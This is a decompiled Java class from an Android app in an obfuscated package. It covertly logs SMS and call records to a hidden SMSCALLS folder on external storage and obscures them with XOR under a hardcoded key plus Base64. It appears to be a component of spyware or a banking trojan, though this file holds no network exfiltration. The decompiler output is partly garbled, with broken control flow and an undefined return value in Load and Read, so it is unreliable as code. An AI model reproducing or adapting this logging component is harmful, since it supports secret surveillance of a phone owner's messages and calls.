/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.os.Environment
 *  android.text.format.DateFormat
 *  android.util.Base64
 */
package linker.resourcer.encoder;

import android.os.Environment;
import android.text.format.DateFormat;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.util.Date;

public class SmsCallsStorage {
    private static final String BASE_FOLDER = "SMSCALLS";
    private static final String SECRET_KEY = "Ed8Gifpwxmw93T4FVTzaQbj9WXmdac";

    public static void Clear(EntryType object) {
        try {
            String string2 = ((Enum)object).name();
            File file = Environment.getExternalStorageDirectory();
            StringBuilder stringBuilder = new StringBuilder();
            object = new File(file, stringBuilder.append("SMSCALLS/").append(string2).toString());
            if (((File)object).exists()) {
                SmsCallsStorage.deleteRecursive((File)object);
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * WARNING - void declaration
     */
    public static String Load(EntryType object3) {
        block7: {
            void var0_7;
            block9: {
                Object object;
                block8: {
                    String string2 = "null";
                    object = ((Enum)object3).name();
                    StringBuilder exception = new StringBuilder();
                    String string3 = exception.append(Environment.getExternalStorageDirectory().toString()).append("/").append(BASE_FOLDER).append("/").append((String)object).toString();
                    object = new File(string3);
                    File[] fileArray = ((File)object).listFiles();
                    if (fileArray == null) break block7;
                    if (fileArray.length == 0) break block7;
                    object = new StringBuilder();
                    for (File file : fileArray) {
                        if (!file.isFile() || !file.getName().endsWith(".txt")) continue;
                        ((StringBuilder)object).append(file.getName().replace(".txt", "")).append("<*P*>");
                    }
                    try {
                        if (((StringBuilder)object).length() != 0) break block8;
                        String string4 = string2;
                        break block9;
                    }
                    catch (Exception exception2) {
                        exception2.printStackTrace();
                        return "null";
                    }
                }
                String string5 = ((StringBuilder)object).toString();
            }
            return var0_7;
        }
        return "null";
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String Read(String object, EntryType object2) {
        Throwable throwable2222222;
        block15: {
            Object object3 = null;
            String[] stringArray = null;
            object2 = ((Enum)object2).name();
            Object object42222222 = Environment.getExternalStorageDirectory();
            object42222222 = new File(object42222222 + "/" + BASE_FOLDER + "/" + (String)object2 + "/", (String)object + ".txt");
            StringBuilder stringBuilder = new StringBuilder();
            object = stringArray;
            object2 = object3;
            if (!((File)object42222222).exists()) {
                return "";
            }
            object = stringArray;
            object2 = object3;
            {
                catch (Throwable throwable2222222) {
                    break block15;
                }
                catch (Exception exception) {}
                object = object2;
                {
                    exception.printStackTrace();
                    if (object2 == null) return stringBuilder.toString();
                }
                try {}
                catch (IOException iOException) {
                    return stringBuilder.toString();
                }
                ((BufferedReader)object2).close();
                return stringBuilder.toString();
            }
            {
                object = stringArray;
                object2 = object3;
                FileInputStream fileInputStream = new FileInputStream((File)object42222222);
                object = stringArray;
                object2 = object3;
                object = stringArray;
                object2 = object3;
                object = stringArray;
                object2 = object3;
                InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
                object = stringArray;
                object2 = object3;
                object = object3 = (object42222222 = new BufferedReader(inputStreamReader));
                object2 = object3;
                object = object3;
                object2 = object3;
                object42222222 = new StringBuilder();
                while (true) {
                    object = object3;
                    object2 = object3;
                    stringArray = ((BufferedReader)object3).readLine();
                    if (stringArray == null) break;
                    object = object3;
                    object2 = object3;
                    ((StringBuilder)object42222222).append((String)stringArray);
                }
                object = object3;
                object2 = object3;
                stringArray = ((StringBuilder)object42222222).toString().split(":::");
                object = object3;
                object2 = object3;
            }
            for (Object object42222222 : stringArray) {
                object = object3;
                object2 = object3;
                {
                    if (((String)object42222222).trim().isEmpty()) continue;
                    object = object3;
                    object2 = object3;
                    stringBuilder.append(SmsCallsStorage.de((String)object42222222));
                }
            }
            {
                ((BufferedReader)object3).close();
                return stringBuilder.toString();
            }
        }
        if (object == null) throw throwable2222222;
        try {
            ((BufferedReader)object).close();
            throw throwable2222222;
        }
        catch (IOException iOException) {
            throw throwable2222222;
        }
    }

    public static void Record(String string2, EntryType entryType) {
        new Thread(new Runnable(){
            final String val$text;
            final EntryType val$type;
            {
                this.val$type = entryType;
                this.val$text = string2;
            }

            /*
             * Loose catch block
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                Object object = this.val$type.name();
                Object object2 = new Date();
                String string2 = ((Object)DateFormat.format((CharSequence)"yyyy-MM-dd", (Date)object2)).toString();
                File file = Environment.getExternalStorageDirectory();
                object2 = new StringBuilder();
                Object object3 = new File(file, ((StringBuilder)object2).append("SMSCALLS/").append((String)object).toString());
                object = new StringBuilder();
                object2 = new File((File)object3, ((StringBuilder)object).append(string2).append(".txt").toString());
                if (!((File)object3).exists()) {
                    ((File)object3).mkdirs();
                }
                object = object2;
                if (((File)object2).exists()) {
                    object = object2;
                    if (((File)object2).length() >= 0x100000L) {
                        int n = 1;
                        do {
                            object = new StringBuilder();
                            object = ((StringBuilder)object).append(string2).append("_").append(n).append(".txt").toString();
                            file = new File((File)object3, (String)object);
                            ++n;
                        } while (file.exists());
                        ((File)object2).renameTo(file);
                        object2 = new StringBuilder();
                        object = new File((File)object3, ((StringBuilder)object2).append(string2).append(".txt").toString());
                    }
                }
                if (!((File)object).exists()) {
                    ((File)object).createNewFile();
                }
                object2 = new StringBuilder();
                object3 = new StringBuilder();
                string2 = ((StringBuilder)object2).append(SmsCallsStorage.en(((StringBuilder)object3).append(this.val$text).append(">").toString())).append(":::").toString();
                object2 = new FileOutputStream((File)object, true);
                object = new OutputStreamWriter((OutputStream)object2);
                object3 = new BufferedWriter((Writer)object);
                ((Writer)object3).write(string2);
                ((BufferedWriter)object3).close();
                ((OutputStreamWriter)object).close();
                ((FileOutputStream)object2).close();
                return;
                catch (Throwable throwable) {
                    try {
                        ((BufferedWriter)object3).close();
                        throw throwable;
                    }
                    catch (Throwable throwable2) {
                        try {
                            throwable.addSuppressed(throwable2);
                            throw throwable;
                        }
                        catch (Throwable throwable3) {
                            try {
                                ((OutputStreamWriter)object).close();
                                throw throwable3;
                            }
                            catch (Throwable throwable4) {
                                try {
                                    throwable3.addSuppressed(throwable4);
                                    throw throwable3;
                                }
                                catch (Throwable throwable5) {
                                    try {
                                        ((FileOutputStream)object2).close();
                                        throw throwable5;
                                    }
                                    catch (Throwable throwable6) {
                                        try {
                                            throwable5.addSuppressed(throwable6);
                                            throw throwable5;
                                        }
                                        catch (Exception exception) {
                                            exception.printStackTrace();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }).start();
    }

    public static void Remove(String string2, EntryType object) {
        String string3 = ((Enum)object).name();
        File file = Environment.getExternalStorageDirectory();
        File file2 = new File(file + "/" + BASE_FOLDER + "/" + string3 + "/", string2 + "\n.txt");
        object = file2;
        if (!file2.exists()) {
            object = new File(file + "/" + BASE_FOLDER + "/" + string3 + "/", string2 + ".txt");
        }
        try {
            if (((File)object).exists()) {
                ((File)object).delete();
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static String de(String string2) {
        byte[] byArray = SECRET_KEY.getBytes("UTF-8");
        Object object = Base64.decode((String)string2, (int)0);
        byte[] byArray2 = new byte[((byte[])object).length];
        int n = 0;
        while (true) {
            if (n >= ((byte[])object).length) break;
            byArray2[n] = (byte)(object[n] ^ byArray[n % byArray.length]);
            ++n;
            continue;
            break;
        }
        try {
            object = new String(byArray2, "UTF-8");
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return string2;
        }
    }

    private static void deleteRecursive(File file) {
        File[] fileArray;
        if (file == null) {
            return;
        }
        if (file.isDirectory() && (fileArray = file.listFiles()) != null) {
            int n = fileArray.length;
            for (int i = 0; i < n; ++i) {
                SmsCallsStorage.deleteRecursive(fileArray[i]);
            }
        }
        file.delete();
    }

    public static String en(String string2) {
        byte[] byArray = SECRET_KEY.getBytes("UTF-8");
        Object object = string2.getBytes("UTF-8");
        byte[] byArray2 = new byte[((byte[])object).length];
        int n = 0;
        while (true) {
            if (n >= ((byte[])object).length) break;
            byArray2[n] = (byte)(object[n] ^ byArray[n % byArray.length]);
            ++n;
            continue;
            break;
        }
        try {
            object = Base64.encodeToString((byte[])byArray2, (int)0);
            return object;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return string2;
        }
    }

    public static enum EntryType {
        SMS,
        CALL;

    }
}

